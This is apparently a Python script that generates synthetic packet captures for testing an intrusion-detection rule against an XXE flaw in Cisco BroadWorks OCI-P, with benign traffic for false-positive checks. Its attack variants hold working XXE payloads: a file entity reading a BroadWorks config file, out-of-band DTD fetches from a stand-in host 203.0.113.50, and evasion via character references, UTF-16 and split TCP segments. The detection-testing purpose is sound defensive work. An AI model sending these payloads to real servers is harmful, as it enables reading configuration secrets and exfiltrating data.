#!/usr/bin/env python3
"""Synthetic (crafted) pcaps for rule 232 - Cisco BroadWorks OCI-P XXE (CVE-2026-20320).

No public PoC or capture exists (Malbear Labs / Cisco withhold payloads).
Message framing follows lukebeer/broadworks-ocip (Builder.php: XML_HEAD +
BroadsoftDocument for TCP on port 2208; SOAP wraps htmlentities(OCI doc) in
<processOCIMessage><arg0>). All addresses are RFC 5737 documentation ranges;
the OOB URLs point to 203.0.113.50 (TEST-NET-3). Payloads only reference files,
nothing executes.
Usage: python3 gen_pcaps.py [outdir]   (default: ./pcaps)
"""

import os
import sys

from scapy.all import IP, TCP, Ether, Raw, wrpcap

OUT = (
    sys.argv[1]
    if len(sys.argv) > 1
    else os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcaps")
)
os.makedirs(OUT, exist_ok=True)
C, S = "198.51.100.23", "192.0.2.10"  # attacker / BroadWorks XSP
Ec = Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02")
Es = Ether(src="02:00:00:00:00:02", dst="02:00:00:00:00:01")
HEAD = b'<?xml version="1.0" encoding="UTF-8"?>'
DOC_OPEN = b'<BroadsoftDocument protocol="OCI" xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'


def oci(command, session=b"a1b2c3d4e5f6", doctype=b""):
    return (
        HEAD
        + doctype
        + DOC_OPEN
        + b'<sessionId xmlns="">'
        + session
        + b"</sessionId>"
        + command
        + b"</BroadsoftDocument>\n"
    )


AUTH = b'<command xsi:type="AuthenticationRequest" xmlns=""><userId>admin</userId></command>'
AUTH_RESP = oci(
    b'<command xsi:type="AuthenticationResponse" xmlns=""><userId>admin</userId>'
    b"<nonce>1763390000123</nonce><passwordAlgorithm>MD5</passwordAlgorithm></command>"
)


def flow(sport, client_msgs, server_msgs, dport=2208, t0=1763390000.0):
    """TCP handshake, then alternate client message / server reply. client_msgs items may be a list
    of segments (to test TCP segmentation)."""
    pk, cs, ss, t = [], 1000, 5000, t0

    def add(p):
        nonlocal t
        p.time = t
        t += 0.01
        pk.append(p)

    add(Ec / IP(src=C, dst=S) / TCP(sport=sport, dport=dport, flags="S", seq=cs - 1))
    add(Es / IP(src=S, dst=C) / TCP(sport=dport, dport=sport, flags="SA", seq=ss - 1, ack=cs))
    add(Ec / IP(src=C, dst=S) / TCP(sport=sport, dport=dport, flags="A", seq=cs, ack=ss))
    for i, m in enumerate(client_msgs):
        for seg in m if isinstance(m, list) else [m]:
            add(
                Ec
                / IP(src=C, dst=S)
                / TCP(sport=sport, dport=dport, flags="PA", seq=cs, ack=ss)
                / Raw(seg)
            )
            cs += len(seg)
        if i < len(server_msgs):
            r = server_msgs[i]
            add(
                Es
                / IP(src=S, dst=C)
                / TCP(sport=dport, dport=sport, flags="PA", seq=ss, ack=cs)
                / Raw(r)
            )
            ss += len(r)
    add(Ec / IP(src=C, dst=S) / TCP(sport=sport, dport=dport, flags="FA", seq=cs, ack=ss))
    add(Es / IP(src=S, dst=C) / TCP(sport=dport, dport=sport, flags="FA", seq=ss, ack=cs + 1))
    add(Ec / IP(src=C, dst=S) / TCP(sport=sport, dport=dport, flags="A", seq=cs + 1, ack=ss + 1))
    return pk


def http_post(path, body, host=b"xsp.example.net"):
    return (
        b"POST "
        + path
        + b" HTTP/1.1\r\nHost: "
        + host
        + b"\r\nContent-Type: text/xml; charset=utf-8\r\n"
        b'SOAPAction: ""\r\nContent-Length: ' + str(len(body)).encode() + b"\r\n\r\n" + body
    )


def soap(oci_doc):
    esc = (
        oci_doc.rstrip(b"\n")
        .replace(b"&", b"&amp;")
        .replace(b"<", b"&lt;")
        .replace(b">", b"&gt;")
        .replace(b'"', b"&quot;")
    )
    return (
        HEAD + b'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
        b'xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
        b'<soapenv:Body><processOCIMessage soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        b'<arg0 xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">'
        + esc
        + b"</arg0></processOCIMessage></soapenv:Body></soapenv:Envelope>"
    )


HTTP_OK = b"HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: 2\r\n\r\nok"
SOAP_PATH = (
    b"/webservice/services/ProvisioningService"  # illustrative; the rule does not use the path
)

ERR = oci(
    b'<command xsi:type="c:ErrorResponse" xmlns:c="C" xmlns="">'
    b'<summary>[Error 4962] Invalid password</summary></command>'
)

V = {
    # V1 classic external general entity, echoed in sessionId
    "attack_v1_file_entity": [
        oci(
            AUTH,
            session=b"&xxe;",
            doctype=b'<!DOCTYPE BroadsoftDocument [<!ENTITY xxe SYSTEM "file:///usr/local/broadworks/bw_base/conf/BroadworksConfig.xml">]>',
        )
    ],
    # V2 blind/OOB parameter entity (the documented class)
    "attack_v2_oob_param": [
        oci(
            AUTH,
            doctype=(
                b'<!DOCTYPE BroadsoftDocument [<!ENTITY % ext SYSTEM "http://203.0.113.50:8000/'
                b'oci.dtd"> %ext; %send;]>'
            ),
        )
    ],
    # V3 external DTD subset, no <!ENTITY keyword
    "attack_v3_ext_dtd": [
        oci(
            AUTH, doctype=b'<!DOCTYPE BroadsoftDocument SYSTEM "http://203.0.113.50:8000/oci.dtd">'
        )
    ],
    # V4 PUBLIC identifier, extra whitespace and newlines
    "attack_v4_public_ws": [
        oci(
            AUTH,
            doctype=(
                b'\n<!DOCTYPE\tBroadsoftDocument\n  PUBLIC "-//x//y" \n "ftp://203.0.113.'
                b'50/oci.dtd" >\n'
            ),
        )
    ],
    # V4b keyword hidden with character references inside an internal parameter entity
    "attack_v4b_charref": [
        oci(
            AUTH,
            doctype=(
                b"<!DOCTYPE BroadsoftDocument [<!ENTITY % a \"&#x3C;!ENTITY &#x25; b "
                b"&#x53;YSTEM 'http://203.0.113.50/x'>\"> %a; %b;]>"
            ),
        )
    ],
}
for name, msgs in V.items():
    wrpcap(os.path.join(OUT, name + ".pcap"), flow(41000 + len(name), msgs, [ERR]))

# V5 OCI over SOAP (HTTP, port 80): OCI doc HTML-escaped inside processOCIMessage
xxe_doc = oci(
    AUTH,
    doctype=(
        b'<!DOCTYPE BroadsoftDocument [<!ENTITY % ext SYSTEM "http://203.0.113.'
        b'50:8000/oci.dtd"> %ext;]>'
    ),
)
wrpcap(
    os.path.join(OUT, "attack_v5_soap.pcap"),
    flow(42001, [http_post(SOAP_PATH, soap(xxe_doc))], [HTTP_OK], dport=80),
)

# V6 UTF-16LE document with BOM
u16 = (
    '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE BroadsoftDocument SYSTEM "http://203.0.113.50/oci.dtd">'
    '<BroadsoftDocument protocol="OCI" xmlns="C"><sessionId xmlns="">s1</sessionId>'
    '<command xsi:type="AuthenticationRequest" xmlns="" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    "<userId>admin</userId></command></BroadsoftDocument>\n"
).encode("utf-16")
wrpcap(os.path.join(OUT, "attack_v6_utf16.pcap"), flow(42002, [u16], [ERR]))

# V7 '<!DOCTYPE' split across two TCP segments (expected miss: per-packet payload scan)
v7 = oci(AUTH, doctype=b'<!DOCTYPE BroadsoftDocument SYSTEM "http://203.0.113.50/oci.dtd">')
cut = v7.index(b"<!DOC") + 5
wrpcap(os.path.join(OUT, "attack_v7_split.pcap"), flow(42003, [[v7[:cut], v7[cut:]]], [ERR]))

# Benign: normal OCI-P session (authenticate, login, get user) with server replies
login = (
    b'<command xsi:type="LoginRequest22V5" xmlns=""><userId>admin</userId>'
    b'<password>5f4dcc3b5aa765d61d8327deb882cf99</password></command>'
)
ug = (
    b'<command xsi:type="UserGetRequest22" xmlns=""><userId>alice@'
    b'voice.example.net</userId></command>'
)
ug_resp = oci(
    b'<command xsi:type="UserGetResponse22" xmlns="">'
    b'<serviceProviderId>SP1</serviceProviderId><groupId>G1</groupId>'
    b'<lastName>Doe</lastName><firstName>Alice</firstName>'
    b'<callingLineIdLastName>Doe</callingLineIdLastName>'
    b'<language>English</language><timeZone>Europe/Paris</timeZone>'
    b'</command>'
)
login_resp = oci(
    b'<command xsi:type="LoginResponse22V5" xmlns="">'
    b'<loginType>System</loginType><locale>en_US</locale>'
    b'<encoding>ISO-8859-1</encoding><isEnterprise>false</isEnterprise>'
    b'<passwordExpiresDays>90</passwordExpiresDays></command>'
)
wrpcap(
    os.path.join(OUT, "benign_ocip.pcap"),
    flow(43001, [oci(AUTH), oci(login), oci(ug)], [AUTH_RESP, login_resp, ug_resp]),
)
# Benign: normal OCI over SOAP
wrpcap(
    os.path.join(OUT, "benign_soap.pcap"),
    flow(43002, [http_post(SOAP_PATH, soap(oci(ug)))], [HTTP_OK], dport=80),
)
# Benign (FP stress): HTTP docs page that starts with an HTML DOCTYPE and
# later mentions processOCIMessage, and a server->client reply from port 2208
# carrying a DOCTYPE (wrong direction for the rule)
html = (
    b'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n'
    b'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" '
    b'"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><body>'
    b'<h1>OCI over SOAP</h1>'
    b'<p>Call processOCIMessage with the OCI document as arg0.</p></body>'
    b'</html>'
)
wrpcap(
    os.path.join(OUT, "benign_html_doctype.pcap"),
    flow(
        43003,
        [b"GET /docs/oci-soap.html HTTP/1.1\r\nHost: docs.example.net\r\n\r\n"],
        [html],
        dport=80,
    )
    + flow(
        43004,
        [oci(AUTH)],
        [HEAD + b'<!DOCTYPE BroadsoftDocument SYSTEM "oci.dtd">' + AUTH_RESP[len(HEAD) :]],
    ),
)
print("wrote", sorted(os.listdir(OUT)))
